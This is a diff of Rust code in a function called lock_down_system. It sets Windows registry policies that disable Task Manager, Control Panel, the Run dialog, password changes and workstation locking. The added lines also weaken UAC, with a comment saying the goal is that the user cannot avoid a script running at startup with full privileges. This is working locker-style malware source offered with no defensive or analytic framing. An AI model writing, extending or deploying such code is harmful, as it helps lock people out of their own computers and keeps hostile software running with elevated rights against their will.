@@ -11,19 +11,14 @@ pub fn lock_down_system() {
     let hkcu = RegKey::predef(HKEY_CURRENT_USER);
     let path = Path::new("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
     let (key, disp) = hkcu.create_subkey(&path).unwrap();
-
     key.set_value("DisableChangePassword", &1u32);
-
     key.set_value("DisableLockWorkstation", &1u32);
-
     key.set_value("DisableTaskMgr", &1u32);
 
     let path = Path::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
     let (key, disp) = hkcu.create_subkey(&path).unwrap();
     key.set_value("HidePowerOptions", &1u32);
-
     key.set_value("NoControlPanel", &1u32);
-
     key.set_value("NoRun", &1u32);
 
     let path = Path::new("SOFTWARE\\Policies\\Microsoft\\Windows\\System");
@@ -34,13 +29,17 @@ pub fn lock_down_system() {
     let path = Path::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
     let (key, disp) = hklm.create_subkey(&path).unwrap();
     key.set_value("HideFastUserSwitching", &1u32);
+    // disables UAC so it's not required after reboot, making it so the user can't avoid the script that easily to run on startup at max power.
+    key.set_value("PromptOnSecureDesktop", &0u32);
+    key.set_value("EnableLUA", &1u32);
+    key.set_value("ConsentPromptBehaviorAdmin", &0u32);
+    key.set_value("ValidateAdminCodeSignatures", &0u32);
+    key.set_value("FilterAdministratorToken", &0u32);
 
     let path = Path::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
     let (key, disp) = hklm.create_subkey(&path).unwrap();
     key.set_value("HidePowerOptions", &1u32);
-
     key.set_value("NoControlPanel", &1u32);
-
     key.set_value("NoRun", &1u32);
 
     let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Search\\AllowFindMyFiles");
